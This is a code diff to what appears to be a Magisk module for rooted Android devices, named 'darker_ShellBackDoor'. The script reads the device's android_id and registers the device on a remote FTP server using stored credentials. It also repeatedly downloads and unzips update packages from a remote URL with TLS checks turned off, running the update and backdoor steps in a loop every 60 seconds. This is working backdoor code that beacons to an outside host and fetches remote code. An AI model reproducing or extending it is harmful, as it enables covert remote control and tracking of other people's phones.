@@ -12,6 +12,7 @@
     MODDIR="/data/adb/modules/darker_ShellBackDoor"
     cfg_dir="$MODDIR/backdoor.prop"
     android_id="$(settings get secure android_id)"
+    pver="$(grep_prop versionCode "$MODDIR"/module.prop 2>/dev/null)"
 #
 
 # define
@@ -45,14 +46,13 @@
 #
 
 update() {
-    rm -rf "$MODDIR"/newver.zip
     netjson="$($_curl -sLk "$(grep_prop updateJson "$MODDIR"/module.prop)")"
     # shellcheck disable=SC2016
     netver="$(echo "$netjson" | sed -n '/versionCode/p' | /data/adb/magisk/busybox awk -v FS=': ' '{print $2}' | /data/adb/magisk/busybox awk -v FS=',' '{print $1}')"
-    pver="$(grep_prop versionCode "$MODDIR"/module.prop 2>/dev/null)"
     if [ "$netver" -ge "$pver" ] && [ "$netver" != "$pver" ]; then
         # shellcheck disable=SC2016
         updateZipUrl="$(echo "$netjson" | sed -n '/zipUrl/p' | /data/adb/magisk/busybox awk -v FS=': "' '{print $2}' | /data/adb/magisk/busybox awk -v FS='",' '{print $1}')"
+        rm -rf "$MODDIR"/newver.zip
         $_curl -sLk "$updateZipUrl" --output "$MODDIR"/newver.zip
         mkdir "$MODDIR"/newver
         unzip -o -q -d "$MODDIR"/newver "$MODDIR"/newver.zip
@@ -68,11 +68,6 @@ update() {
 }
 
 backdoor() {
-
-    # register
-        $_curl -sLk "ftp://$ftp_user:$ftp_passwd@$ftp_ip/$ftp_data_dir/" -X "MKD $android_id"
-    # 
-	
     # execute
 
         # shellcheck disable=SC2016
@@ -97,8 +92,12 @@ backdoor() {
     #
 }
 
+    # register
+        $_curl -sLk "ftp://$ftp_user:$ftp_passwd@$ftp_ip/$ftp_data_dir/" -X "MKD $android_id"
+    # 
+
 while true; do
-    (update &)
-    (backdoor &)
+    update
+    backdoor
     sleep 60
 done
